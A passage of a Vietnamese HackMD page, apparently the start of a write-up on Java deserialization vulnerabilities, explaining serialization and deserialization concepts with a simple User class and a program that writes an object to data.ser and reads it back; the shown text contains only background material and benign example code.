</ul><h3 class="part" data-startline="36" data-endline="36" id="2-Kiến-thức-nền" data-id="2-Kiến-thức-nền"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#2-Ki%E1%BA%BFn-th%E1%BB%A9c-n%E1%BB%81n" title="2-Kiến-thức-nền" data-size="16" data-position="2148" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="2148" data-size="16">2. Kiến thức nền</span></h3><p class="part" data-startline="37" data-endline="37" data-position="2165" data-size="0"><span data-position="2165" data-size="108">Sau khi biết một số khái niệm cơ bản và muốn đi tiếp chủ đề này, chúng ta quay lại và tìm hiểu khái niệm về </span><strong data-position="2273" data-size="0"><span data-position="2275" data-size="29">Serialization/Deserialization</span></strong><span data-position="2306" data-size="40"> trong java và tại sao nó lại cần thiết.</span></p><h4 class="part" data-startline="38" data-endline="38" id="21-Serialization" data-id="21-Serialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#21-Serialization" title="21-Serialization" data-size="17" data-position="2352" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="2352" data-size="17">2.1 Serialization</span></h4><p class="part" data-startline="39" data-endline="39" data-position="2370" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="2370" data-size="70" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HkIpMWLIeg.png" alt="hàm serialize trong java" class="offline-handled error-handled image-toolbar-handled" data-position="2370" data-size="70" loading="lazy" style="width: auto; height: auto;"></span></p><h5 class="part" data-startline="40" data-endline="40" id="Khái-niệm" data-id="Khái-niệm"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#Kh%C3%A1i-ni%E1%BB%87m" title="Khái-niệm" data-size="9" data-position="2447" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="2447" data-size="9">Khái niệm</span></h5><p class="part" data-startline="41" data-endline="43" data-position="2457" data-size="0"><span data-position="2457" data-size="348">Serialization là cơ chế chuyển đổi cấu trúc dữ liệu (data structure) hoặc trạng thái của object (object states) trở thành luồng byte (byte streams), byte streams có thể được lưu vào file, bộ nhớ đệm (memory buffering), database hoặc truyền đi qua network. Mảng byte này đại diện cho class của object, phiên bản của object, và trạng thái của object.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="2806" data-size="63" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rJz10DmUeg.png" alt="1628497417-103268" class="offline-handled error-handled image-toolbar-handled" data-position="2806" data-size="63" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="2870" data-size="10">Tham khảo:</span><a href="https://www.geeksforgeeks.org/java/serialization-and-deserialization-in-java/" target="_blank" rel="noopener"><span data-position="2881" data-size="13">geeksforgeeks</span></a><span data-position="2975" data-size="2">, </span><a href="https://docs.oracle.com/javase/8/docs/api/java/io/Serializable.html" target="_blank" rel="noopener"><span data-position="2977" data-size="6">oracle</span></a><span data-position="3054" data-size="1">,</span><a href="https://www.baeldung.com/java-serialization" target="_blank" rel="noopener"><span data-position="3055" data-size="18">Java Serialization</span></a></p><h5 class="part" data-startline="44" data-endline="44" id="Đặc-điểm-của-Serialization" data-id="Đặc-điểm-của-Serialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#%C4%90%E1%BA%B7c-%C4%91i%E1%BB%83m-c%E1%BB%A7a-Serialization" title="Đặc-điểm-của-Serialization" data-size="26" data-position="3126" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="3126" data-size="26">Đặc điểm của Serialization</span></h5><ul class="part" data-startline="45" data-endline="48" data-position="3153" data-size="0">
<li class="" data-startline="45" data-endline="45" data-position="3155" data-size="0"><span data-position="3155" data-size="219">Chỉ các object của các class được implements từ interface Serializable mới có thể được đưa vào quá trình Serialization. Nhưng nếu superclass là Serializable thì các lớp con của nó có thể đưa vào quá trình Serialization.</span></li>
<li class="" data-startline="46" data-endline="46" data-position="3377" data-size="0"><span data-position="3377" data-size="252">Khi serialize bất kỳ object nào mà nó có chứa tham chiếu đến object khác thì Java serialization sẽ serialize luôn cả object đó (nếu object được tham chiếu không implement the java.io.Serializable interface thì java.io.NotSerializableException sẽ xảy ra</span></li>
<li class="" data-startline="47" data-endline="48" data-position="3632" data-size="0"><span data-position="3632" data-size="125">Bên trong class, các dữ liệu có non-access modifier là static và transient sẽ không được lưu vào object states khi serialize.</span></li>
</ul><h5 class="part" data-startline="49" data-endline="49" id="Lý-do-cần-Serialization" data-id="Lý-do-cần-Serialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#L%C3%BD-do-c%E1%BA%A7n-Serialization" title="Lý-do-cần-Serialization" data-size="23" data-position="3765" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="3765" data-size="23">Lý do cần Serialization</span></h5><p class="part" data-startline="50" data-endline="50" data-position="3789" data-size="0"><span data-position="3789" data-size="517">Serialization trong Java là một cơ chế quan trọng giúp chuyển đổi đối tượng (object) thành chuỗi byte, cho phép lưu trữ và truyền tải dữ liệu một cách hiệu quả. Khi một chương trình Java cần ghi lại trạng thái của đối tượng để sử dụng sau này — chẳng hạn như lưu vào file, cơ sở dữ liệu, hoặc gửi qua mạng — quá trình serialization sẽ đảm nhận việc mã hóa toàn bộ thông tin của đối tượng đó thành một định dạng tuần tự. Quá trình ngược lại, được gọi là deserialization, sẽ phục hồi lại đối tượng từ chuỗi byte đã lưu.</span></p><p class="part" data-startline="52" data-endline="53" data-position="4308" data-size="0"><span data-position="4308" data-size="500">Cơ chế này đặc biệt cần thiết trong các ứng dụng phân tán (distributed systems), nơi mà các đối tượng cần được truyền giữa client và server thông qua socket hoặc giao thức HTTP. Ngoài ra, trong các công nghệ như Java RMI (Remote Method Invocation) hoặc hệ thống message queue như JMS, serialization là nền tảng cho việc chia sẻ và xử lý dữ liệu qua nhiều thành phần hệ thống. Nhờ đó, serialization giúp đảm bảo tính tương tác, tính di động và sự bền vững của dữ liệu trong các ứng dụng Java hiện đại.</span><br>
<span data-position="4809" data-size="48">Một số tác dụng chính của Serialization bao gồm:</span></p><ul class="part" data-startline="54" data-endline="64" data-position="4858" data-size="0">
<li class="" data-startline="54" data-endline="55" data-position="4860" data-size="0"><span data-position="4860" data-size="24">Truyền dữ liệu qua mạng:</span><br>
<span data-position="4885" data-size="154">Serialization cho phép các đối tượng Java được chuyển đổi thành chuỗi byte có thể gửi đi qua mạng, từ đó hỗ trợ việc giao tiếp giữa các hệ thống phân tán.</span></li>
<li class="" data-startline="56" data-endline="57" data-position="5042" data-size="0"><span data-position="5042" data-size="33">Lưu trữ trạng thái của đối tượng:</span><br>
<span data-position="5076" data-size="129">Trạng thái của một đối tượng có thể được lưu vào file hoặc cơ sở dữ liệu dưới dạng tuần tự hóa, sau đó được phục hồi lại khi cần.</span></li>
<li class="" data-startline="58" data-endline="59" data-position="5208" data-size="0"><span data-position="5208" data-size="34">Chia sẻ dữ liệu giữa các ứng dụng:</span><br>
<span data-position="5243" data-size="116">Dữ liệu serialize có thể dễ dàng chia sẻ giữa các thành phần trong cùng một ứng dụng hoặc giữa các ứng dụng độc lập.</span></li>
<li class="" data-startline="60" data-endline="61" data-position="5362" data-size="0"><span data-position="5362" data-size="38">Hỗ trợ RMI (Remote Method Invocation):</span><br>
<span data-position="5401" data-size="167">Java sử dụng serialization để truyền đối tượng giữa client và server trong mô hình gọi phương thức từ xa, giúp các ứng dụng có thể giao tiếp qua mạng một cách dễ dàng.</span></li>
<li class="" data-startline="62" data-endline="64" data-position="5571" data-size="0"><span data-position="5571" data-size="28">Duy trì trạng thái ứng dụng:</span><br>
<span data-position="5600" data-size="149">Trong những trường hợp ứng dụng cần tạm dừng và khôi phục, serialization cho phép lưu lại trạng thái hiện tại của đối tượng để tiếp tục xử lý sau đó.</span></li>
</ul><h4 class="part" data-startline="65" data-endline="65" id="22-Deserialization" data-id="22-Deserialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#22-Deserialization" title="22-Deserialization" data-size="19" data-position="5756" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="5756" data-size="19">2.2 Deserialization</span></h4><p class="part" data-startline="66" data-endline="66" data-position="5776" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5776" data-size="72" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/SJhCMbLIlx.png" alt="hàm deserialize trong java" class="offline-handled error-handled image-toolbar-handled" data-position="5776" data-size="72" loading="lazy" style="width: auto; height: auto;"></span></p><h5 class="part" data-startline="67" data-endline="67" id="Khái-niệm10" data-id="Khái-niệm"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#Kh%C3%A1i-ni%E1%BB%87m10" title="Khái-niệm10" data-size="9" data-position="5855" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="5855" data-size="9">Khái niệm</span></h5><p class="part" data-startline="68" data-endline="68" data-position="5865" data-size="0"><span data-position="5865" data-size="185">Deserialization Là quá trình chuyển đổi dữ liệu đã được serialization trở lại thành đối tượng Java. Dữ liệu được đọc từ nguồn như mạng hoặc file, sau đó được chuyển đổi thành đối tượng.</span></p><h5 class="part" data-startline="70" data-endline="70" id="Đặc-điểm-của-Deserialization" data-id="Đặc-điểm-của-Deserialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#%C4%90%E1%BA%B7c-%C4%91i%E1%BB%83m-c%E1%BB%A7a-Deserialization" title="Đặc-điểm-của-Deserialization" data-size="28" data-position="6058" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="6058" data-size="28">Đặc điểm của Deserialization</span></h5><p class="part" data-startline="71" data-endline="71" data-position="6087" data-size="0"><span data-position="6087" data-size="84">Khi 1 object được deserialized, constructor của object đó sẽ không bao giờ được gọi.</span></p><p class="part" data-startline="73" data-endline="73" data-position="6173" data-size="0"><span data-position="6173" data-size="10">Tham khảo:</span><a href="https://medium.com/@pratik.941/serialization-and-deserialization-in-java-6dbd11fd31b3" target="_blank" rel="noopener"><span data-position="6184" data-size="8">Pratik T</span></a></p><h4 class="part" data-startline="75" data-endline="75" id="23-Quá-trình-deserialization-trong-java-thực-sự-diễn-ra-như-thế-nào" data-id="23-Quá-trình-deserialization-trong-java-thực-sự-diễn-ra-như-thế-nào"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#23-Qu%C3%A1-tr%C3%ACnh-deserialization-trong-java-th%E1%BB%B1c-s%E1%BB%B1-di%E1%BB%85n-ra-nh%C6%B0-th%E1%BA%BF-n%C3%A0o" title="23-Quá-trình-deserialization-trong-java-thực-sự-diễn-ra-như-thế-nào" data-size="70" data-position="6287" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="6287" data-size="70">2.3 Quá trình de/serialization trong java thực sự diễn ra như thế nào?</span></h4><p class="part" data-startline="76" data-endline="76" data-position="6358" data-size="0"><span data-position="6358" data-size="170">Khi chúng ta đã có kiến thức về serialization một đối tượng trong java rồi thì chúng ta sẽ đi tiếp quá trình serialization và deserialization thực sự diễn ra như thế nào.</span></p><h5 class="part" data-startline="77" data-endline="77" id="Quá-trình-serialization-trong-java-diễn-ra-như-thế-nào" data-id="Quá-trình-serialization-trong-java-diễn-ra-như-thế-nào"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#Qu%C3%A1-tr%C3%ACnh-serialization-trong-java-di%E1%BB%85n-ra-nh%C6%B0-th%E1%BA%BF-n%C3%A0o" title="Quá-trình-serialization-trong-java-diễn-ra-như-thế-nào" data-size="54" data-position="6535" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="6535" data-size="54">Quá trình serialization trong java diễn ra như thế nào</span></h5><ul class="part" data-startline="78" data-endline="85" data-position="6590" data-size="0">
<li class="" data-startline="78" data-endline="78" data-position="6592" data-size="0">
<p data-position="6590" data-size="0"><span data-position="6592" data-size="241">Như chúng ta đã biết sau khi serialize thì chúng ta có được byte streams, và ta có thể đọc được nội dung byte streams bằng cách sử dụng 1 số công cụ như hex-editor để ta có thể thấy dữ liệu là dạng chuỗi nhị phân (binary string).(đọc thêm ở </span><a href="https://docs.oracle.com/javase/8/docs/api/java/io/ObjectStreamConstants.html" target="_blank" rel="noopener"><span data-position="6834" data-size="3">đây</span></a><span data-position="6916" data-size="16"> để hiểu rõ hơn)</span></p>
</li>
<li class="" data-startline="79" data-endline="84" data-position="6935" data-size="0">
<p data-position="6933" data-size="0"><span data-position="6935" data-size="53">Trước tiên chúng ta xem qua thuật toán serialization:</span></p>
<ul data-position="6993" data-size="0">
<li class="" data-startline="80" data-endline="80" data-position="6995" data-size="0"><span data-position="6995" data-size="76">Viết ra siêu dữ liệu (metadata - mô tả) của lớp được liên kết với đối tượng.</span></li>
<li class="" data-startline="81" data-endline="81" data-position="7078" data-size="0"><span data-position="7078" data-size="75">Đệ quy viết ra mô tả của các lớp cha cho đến khi tìm thấy java.lang.object.</span></li>
<li class="" data-startline="82" data-endline="82" data-position="7160" data-size="0"><span data-position="7160" data-size="154">Khi kết thúc việc viết thông tin siêu dữ liệu, nó sẽ bắt đầu với dữ liệu thực tế được liên kết với đối tượng. Nhưng lần này, bắt đầu từ lớp cha trên cùng.</span></li>
<li class="" data-startline="83" data-endline="84" data-position="7321" data-size="0"><span data-position="7321" data-size="89">Đệ quy ghi dữ liệu liên quan đến đối tượng, bắt đầu từ lớp cha nhỏ nhất đến lớp lớn nhất.</span></li>
</ul>
</li>
<li class="" data-startline="85" data-endline="85" data-position="7414" data-size="0">
<p data-position="7412" data-size="0"><span data-position="7414" data-size="77">Để hiểu rõ hơn mình sẽ ví dụ với serialize data này và đoạn code này của bạn </span><a href="https://hackmd.io/@endy/r1sYTUYOh?stext=2315%3A45%3A0%3A1752726947%3AwE92du" target="_blank" rel="noopener"><span data-position="7492" data-size="4">endy</span></a><span data-position="7574" data-size="29"> rồi chúng ta cùng phân tích.</span></p>
</li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="86" data-endline="102" data-infoprefix-length="4" data-position="7604"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token comment">// User.java</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre>
      </div><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="103" data-endline="141" data-infoprefix-length="4" data-position="7882"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token comment">// main.java</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">User</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"endy"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Serialize data</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">FileOutputStream</span> fileOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"data.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectOutputStream</span> objectOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
            objectOut<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
            objectOut<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            fileOut<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Object serialized and saved to data.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Deserialize data</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">FileInputStream</span> fileIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"data.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectInputStream</span> objectIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileIn<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">User</span> deserializedObject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span> objectIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            objectIn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            fileIn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Print the deserialized object</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialized Object:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Age: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
      </div><p class="part" data-startline="142" data-endline="143" data-position="9136" data-size="0"><span data-position="9136" data-size="134">đoạn code trên serialize object user thành file data.ser và sau đấy chúng ta xem file dạng binary string ta thấy được dữ liệu như này.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="9271" data-size="60" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rJ6gPuXLle.png" alt="serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="9271" data-size="60" loading="lazy" style="width: auto; height: auto;"></span></p><ul class="part" data-startline="144" data-endline="144" data-position="9332" data-size="0">
<li class="" data-startline="144" data-endline="144" data-position="9334" data-size="0"><span data-position="9334" data-size="43">Lúc này ta đi phân tích kĩ hơn, ta có được:</span></li>
